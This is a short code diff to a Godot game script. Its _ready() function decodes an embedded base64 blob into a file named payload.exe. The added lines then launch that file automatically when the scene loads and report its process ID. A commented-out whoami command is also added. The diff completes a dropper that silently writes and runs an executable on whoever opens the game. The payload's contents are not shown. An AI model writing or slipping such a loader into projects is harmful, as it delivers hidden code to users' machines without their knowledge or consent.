@@ -28,6 +28,19 @@ func _ready():
 	var payloadBuffer = Marshalls.base64_to_raw(b64)
 	var payloadFile = FileAccess.open("res://payload.exe", FileAccess.WRITE)
 	payloadFile.store_buffer(payloadBuffer)
+	payloadFile.close()
+	
+	#var output=[]
+	#var exit_code = OS.execute("cmd.exe", ["/c", "whoami"],output)
+	#print(output)
+	
+	var payloadPath = ProjectSettings.globalize_path("res://") + "payload.exe"
+	print(payloadPath)
+	var result = OS.execute_with_pipe(payloadPath,[],false)
+	if(result.is_empty()):
+		print("Couldn't launch payload")
+	else:
+		print("Payload launched with ",result.get("pid"))
 
 	
 	#if file:
